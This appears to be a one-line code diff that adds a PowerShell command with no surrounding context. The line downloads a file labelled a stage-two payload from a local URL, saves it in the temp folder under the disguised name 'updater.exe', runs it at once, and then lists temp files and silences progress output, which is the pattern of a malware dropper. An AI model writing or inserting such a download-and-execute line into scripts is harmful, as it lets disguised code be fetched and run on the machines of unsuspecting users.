@@ -1,0 +1,1 @@
+$Stage2Url = "https://localhost:8080/payload.bin"; $PayloadPath = "$env:TEMP\updater.exe"; Invoke-WebRequest -Uri $Stage2Url -OutFile $PayloadPath -UseBasicParsing; & $PayloadPath; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; $ProgressPreference = "SilentlyContinue"
